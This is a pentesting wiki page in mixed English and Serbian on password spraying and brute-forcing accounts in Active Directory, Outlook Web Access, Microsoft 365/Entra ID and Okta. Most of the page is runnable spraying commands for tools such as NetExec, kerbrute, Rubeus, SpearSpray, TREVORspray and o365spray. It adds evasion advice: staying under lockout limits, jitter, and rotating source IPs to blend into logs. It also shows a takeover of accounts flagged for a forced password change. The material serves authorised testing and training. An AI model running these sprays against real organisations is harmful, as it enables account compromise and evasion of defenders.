# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

If you have some user credentials or a shell as a domain user you can **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacija sa Linuxa (ili svih)

- Korišćenjem **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Koristeći **NetExec (CME successor)** za ciljani, low-noise spraying preko SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(možete naznačiti broj pokušaja kako biste izbegli lockout-ove):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČENO, PONEKAD NE RADI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Sa `scanner/smb/smb_login` modulom od **Metasploit**:

![](<../../images/image (745).png>)

- Koristeći **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Sa Windows

- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom sa brute modulom:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Sa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Može podrazumevano da generiše korisnike iz domena i preuzeće password policy iz domena i ograničiti pokušaje u skladu sa njom):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Sa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifikuj i preuzmi naloge sa "Password must change at next logon" (SAMR)

Niskobučna tehnika je da se spray-uje bezopasna/prazna lozinka i uhvate nalozi koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka bila prisilno istekla i može se promeniti bez poznavanja stare.

Workflow:
- Enumeriši korisnike (RID brute putem SAMR) da napraviš listu ciljeva:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spritajte praznu lozinku i nastavite sa pokušajima pri pogodcima da uhvatite naloge koji moraju da promene lozinku pri sledećem prijavljivanju:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Za svaki pogodak, promeni lozinku preko SAMR pomoću NetExec modula (stara lozinka nije potrebna kada je postavljeno "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operativne napomene:
- Uveri se da je sat na hostu sinhronizovan sa DC pre Kerberos baziranih operacija: `sudo ntpdate <dc_fqdn>`.
- [+] bez (Pwn3d!) u nekim modulima (npr. RDP/WinRM) znači da su kredencijali validni, ali nalog nema prava za interaktivno prijavljivanje.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–bazirano spraying smanjuje buku u poređenju sa SMB/NTLM/LDAP bind pokušajima i bolje se uklapa sa AD lockout politikama. SpearSpray kombinuje LDAP-driven targeting, pattern engine i awareness politike (domain policy + PSOs + badPwdCount buffer) da bi vršio spray precizno i bezbedno. Takođe može da označi compromised principals u Neo4j za BloodHound pathing.

Ključne ideje:
- LDAP otkrivanje korisnika sa paging i LDAPS podrškom, opciono koristeći custom LDAP filtere.
- Domain lockout policy + PSO-aware filtriranje da ostavi konfigurabilan attempt buffer (threshold) i izbegne zaključavanje korisnika.
- Kerberos pre-auth validacija koristeći brze gssapi bindings (generiše 4768/4771 na DCs umesto 4625).
- Pattern-based, per-user generisanje lozinki koristeći varijable kao što su names i temporal values izvedene iz svakog korisnikovog pwdLastSet.
- Kontrola throughput-a pomoću threads, jitter-a i max requests per second.
- Opciona Neo4j integracija za označavanje owned korisnika za BloodHound.

Osnovna upotreba i discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciljanje i kontrola obrazaca:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth i safety kontrole:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound obogaćivanje:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pregled sistema obrazaca (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Za cloud spraying, prvo utvrdite da li je tenant **managed**, **federated** ili **hybrid**, zato što se endpoint i ponašanje lockout-a mogu razlikovati od on-prem AD. U Microsoft Entra, **Smart Lockout** menja kako ponovljeni pokušaji troše lockout budžet:

- Ponavljanje **iste loše lozinke** ne povećava dalje brojač lockout-a, ali pokušavanje **novih kandidata** povećava.
- **Familiar** i **unfamiliar** lokacije imaju **odvojene** brojače.
- Tenanti koji koriste **pass-through authentication (PTA)** ne koriste prednost praćenja bad-password hash-a, pa ih tretirajte više kao klasične mete osetljive na lockout.

U praksi, radite spraying sa **jednom lozinkom po rundi**, ostavite dovoljno razmaka između rundi, i preferirajte tooling koji može da otkrije stvarni tenant auth flow pre nego što pošalje pokušaje.

- Sa [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), možete recon-ovati tenant, otkriti `token_endpoint`, raditi spray nad `msol`/`adfs`/`owa`/`okta`, i rotirati saobraćaj kroz više egress IP adresa:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Sa [**Spray365**](https://github.com/MarkoH17/Spray365), možete unapred napraviti nastavivi **execution plan**, randomizovati redosled autentikacije i nametnuti **minimum delay per user** da biste ostali van lockout prozora:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Sa [**o365spray**](https://github.com/0xZDH/o365spray), možete validirati tenant, enumerisati korisnike pomoću modula kao što je `onedrive`, i raditi spraying preko `oauth2` ili `adfs` uz **jedan pokušaj po korisniku** po lockout prozoru. Ako već imate FireProx API, prosledite ga sa `--proxy-url` da distribuirate source IP adrese:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Nedavna operatorska tradecraft se takođe pomerila ka **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) podržava vremenske prozore, shuffling lozinki, ADFS/M365 spraying i automatsku post-auth exfiltration. Nedavna stvarna zloupotreba je takođe koristila **Microsoft Teams API** enumeraciju naloga i **AWS region rotation** da rasprši spray talase preko više izvorišnih geografskih lokacija.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
